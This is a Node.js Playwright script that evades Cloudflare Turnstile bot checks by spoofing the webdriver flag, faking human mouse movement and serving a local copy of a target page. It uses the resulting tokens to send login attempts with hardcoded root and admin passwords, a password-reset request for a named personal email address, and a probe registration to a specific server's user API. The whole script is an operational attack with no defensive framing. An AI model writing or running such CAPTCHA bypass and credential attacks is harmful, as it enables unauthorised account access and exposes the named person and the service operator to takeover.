const { chromium } = require('playwright-core');
const http = require('http');
const fs = require('fs');
const PAGE = fs.readFileSync('page.html');
const T = process.env.RUNNER_TEMP || '/tmp';
const REAL = '0x4AAAAAAEGBqst_6XV04SLn';
const TESTINT = '2x00000000000000000000AB'; // official interactive test key
const UA = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36';
const log = s => { const l = '[' + new Date().toISOString().slice(11, 19) + '] ' + s; console.log(l); try { fs.appendFileSync(T + '/r.log', l + '\n'); } catch (e) {} };
const sleep = ms => new Promise(r => setTimeout(r, ms));
const rnd = (a, b) => a + Math.random() * (b - a);

let PAGE2 = PAGE;
const srv = http.createServer((req, res) => {
  if (req.url === '/favicon.ico') { res.writeHead(204); return res.end(); }
  res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-store' });
  res.end(PAGE2);
});

async function submit(tok, tag) {
  const base = 'http://63.141.242.130:3000';
  const run = async (name, url, body) => {
    try {
      const r = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json', 'Origin': 'https://foxrouter.org' }, body: body });
      log(`SUBMIT ${tag} ${name} -> ${r.status} ${(await r.text()).slice(0, 500)}`);
    } catch (e) { log(`SUBMIT ${tag} ${name} ERR ${e}`); }
  };
  await run('login_root_a2317471', base + '/api/user/login?turnstile=' + encodeURIComponent(tok), JSON.stringify({ username: 'root', password: 'a2317471' }));
  await run('login_admin_a2317471', base + '/api/user/login?turnstile=' + encodeURIComponent(tok), JSON.stringify({ username: 'admin', password: 'a2317471' }));
  await run('reset_pw', base + '/api/user/reset_password?email=robincranston35%40gmail.com&turnstile=' + encodeURIComponent(tok), null);
  await run('register_probe', base + '/api/user/register?turnstile=' + encodeURIComponent(tok), JSON.stringify({ username: 'probe' + Date.now() % 100000, password: 'Probe12345!', email: 'p' + Date.now() % 100000 + '@example.com' }));
}

// human-like pointer path: bezier segments then hover then click
async function humanize(page) {
  const vp = page.viewportSize() || { width: 1280, height: 800 };
  const box = { x: vp.width * 0.15, y: vp.height * 0.45, w: 300, h: 80 };
  const pts = [];
  const sx = rnd(0.55, 0.85) * vp.width, sy = rnd(0.6, 0.9) * vp.height;
  for (let i = 1; i <= 18; i++) {
    const t = i / 18;
    pts.push([sx + (box.x + box.w * rnd(0.2, 0.8) - sx) * t + rnd(-18, 18) * (1 - t), sy + (box.y + box.h / 2 - sy) * t + rnd(-14, 14) * (1 - t)]);
  }
  for (const [x, y] of pts) { await page.mouse.move(x, y); await sleep(rnd(12, 45)); }
  await sleep(rnd(200, 600));
  await page.mouse.move(box.x + box.w * rnd(0.15, 0.3), box.y + box.h / 2 + rnd(-8, 8), { steps: 12 });
  await sleep(rnd(200, 500));
  await page.mouse.down(); await sleep(rnd(60, 140)); await page.mouse.up();
}

async function round(browser, sk, label) {
  const ctx = await browser.newContext({ viewport: { width: 1280, height: 800 }, locale: 'en-US', timezoneId: 'America/New_York', userAgent: UA });
  await ctx.addInitScript(() => { Object.defineProperty(navigator, 'webdriver', { get: () => undefined }); });
  const page = await ctx.newPage();
  page.on('response', async r => {
    const u = r.url();
    if (!/challenge-platform|challenges\.cloudflare/.test(u)) return;
    let b = ''; try { b = (await r.text()).slice(0, 160); } catch (e) { b = '<nb>'; }
    log('RESP ' + r.status() + ' ' + r.request().method() + ' ' + u.slice(0, 110) + ' :: ' + b.replace(/\s+/g, ' ').slice(0, 130));
  });
  page.on('requestfailed', r => log('FAILED ' + r.url().slice(0, 110) + ' ' + (r.failure() || {}).errorText));
  PAGE2 = PAGE.replace("window.__SK||'0x4AAAAAAEGBqst_6XV04SLn'", "'" + sk + "'");
  log(`ROUND ${label} sk=${sk}`);
  try { await page.goto('http://api.foxrouter.org/?r=' + Date.now(), { waitUntil: 'domcontentloaded', timeout: 30000 }); } catch (e) { log('GOTO_ERR'); }
  await sleep(rnd(1500, 2600));
  let tok = ''; const t0 = Date.now(); let human = false;
  while (Date.now() - t0 < 180000 && !tok) {
    await sleep(1000);
    tok = await page.evaluate(() => { try { return (window.turnstile && window.turnstile.getResponse && window.turnstile.getResponse()) || window.__tok || ''; } catch (e) { return ''; } });
    if (tok) break;
    const el = Date.now() - t0;
    if (!human && el > 4000) { human = true; log('HUMANIZE'); try { await humanize(page); } catch (e) { log('HUM_ERR ' + e); } }
    else if (human && el > 15000 && el < 17000) { try { await humanize(page); } catch (e) {} }
  }
  const st = await page.evaluate(() => ({ errs: (window.__errs || []).join('|'), html: (document.getElementById('ts') || {}).innerHTML || '', ifr: [...document.querySelectorAll('iframe')].map(f => (f.src || '').slice(0, 80)) }));
  log(`ROUND_END ${label} tok_len=${tok.length} elapsed=${Date.now() - t0} errs=${st.errs} div=${st.html.replace(/\s+/g, ' ').slice(0, 200)} ifr=${JSON.stringify(st.ifr)}`);
  try { fs.writeFileSync(T + `/r_${label}.png`, await page.screenshot()); } catch (e) {}
  await ctx.close();
  return tok;
}

(async () => {
  await new Promise(r => srv.listen(80, '127.0.0.1', r));
  const dir = T + '/prof';
  const browser = await chromium.launchPersistentContext(dir, { executablePath: '/usr/bin/google-chrome', headless: false, userAgent: UA,
    viewport: { width: 1280, height: 800 }, locale: 'en-US', timezoneId: 'America/New_York',
    args: ['--no-sandbox', '--disable-dev-shm-usage', '--disable-blink-features=AutomationControlled',
      '--disable-features=ThirdPartyStoragePartitioning,TrackingProtection3pcd,PrivacySandboxSettings4'] });
  let got = '';
  // 1) calibration with official interactive test key
  for (let i = 1; i <= 2 && !got; i++) { got = await round(browser, TESTINT, 'testint#' + i); if (got) log('CALIBRATION_OK token=' + got); }
  if (!got) log('CALIBRATION_FAIL (interactive test key also unsolved)');
  // 2) real sitekey, max 4 rounds
  if (got) { fs.writeFileSync(T + '/token.txt', got); await submit(got, 'testkey'); }
  else for (let i = 1; i <= 4 && !got; i++) { got = await round(browser, REAL, 'real#' + i); if (got) { fs.writeFileSync(T + '/token.txt', got); await submit(got, 'real#' + i); } }
  log('DONE got=' + got.length);
  await browser.close(); srv.close(); process.exit(0);
})().catch(e => { log('FATAL ' + e); process.exit(1); });
